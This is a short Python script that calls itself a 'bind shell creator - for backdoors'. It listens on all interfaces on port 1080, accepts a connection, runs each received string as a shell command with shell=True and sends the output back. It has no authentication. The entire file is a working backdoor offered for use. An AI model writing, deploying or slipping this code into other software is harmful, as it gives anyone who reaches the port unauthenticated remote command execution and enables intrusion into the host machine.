import socket
import subprocess

print("Bind shell creator - for backdoors")

# Verbosely  - just for debugging

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Socket created - socket.AF_INET, socket.SOCK_STREAM")
except Exception:
	print(f"Cannot create socket. Debugging info: {Exception}")

address = "0.0.0.0"
port = 1080
try:
	s.bind((address, port))
	print(f"Bind successful - on {address}:{port}")
except:
	print(f"Bind unsuccessful")

try:
	s.listen(5)
	print("Waiting for connection....")
except:
        print("error while listening.")

welcome_msg = "Welcome. You are connected to the bind shell. "

conn, address = s.accept()
print(f"You are connect with: {address}")
conn.sendall(welcome_msg.encode())

while True: 
	recv_command = conn.recv(2048) # Command must be < 2048 char
	print(f"$ {recv_command.decode()}")

	call = subprocess.run(recv_command.decode(), shell=True, capture_output=True)
	"""
	If there are any better function than check_output that if I enter a command but it is
	an invalid command it still print the unsuccessful output pls contribute
	"""
	output = call.stdout.decode()
	error = call.stderr.decode()
	if len(output) > 0 and len(error) <= 0:
		conn.sendall(output.encode())
	elif len(error) > 0 and len(output) <= 0:
		conn.sendall(error.encode())
